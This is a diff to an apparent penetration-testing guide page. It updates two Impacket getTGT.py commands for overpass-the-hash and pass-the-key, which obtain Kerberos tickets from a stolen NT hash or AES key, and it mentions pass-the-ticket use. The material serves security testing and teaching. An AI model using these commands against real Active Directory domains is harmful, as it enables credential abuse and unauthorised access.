@@ -26,10 +26,10 @@ The [Impacket](https://github.com/SecureAuthCorp/impacket) script [getTGT](https
 
 ```bash
 # with an NT hash (overpass-the-hash)
-getTGT.py -hashes 'LMhash:NThash' $DOMAIN/$USER@$TARGET
+getTGT.py -hashes ":$NT_HASH" $DOMAIN/$USER@$TARGET
 
 # with an AES (128 or 256 bits) key (pass-the-key)
-getTGT.py -aesKey 'KerberosKey' $DOMAIN/$USER@$TARGET
+getTGT.py -aesKey "$AES_KEY" $DOMAIN/$USER@$TARGET
 ```
 
 Once a TGT is obtained, the tester can use it with the environment variable `KRB5CCNAME` with tools implementing [pass-the-ticket](ptt.md).
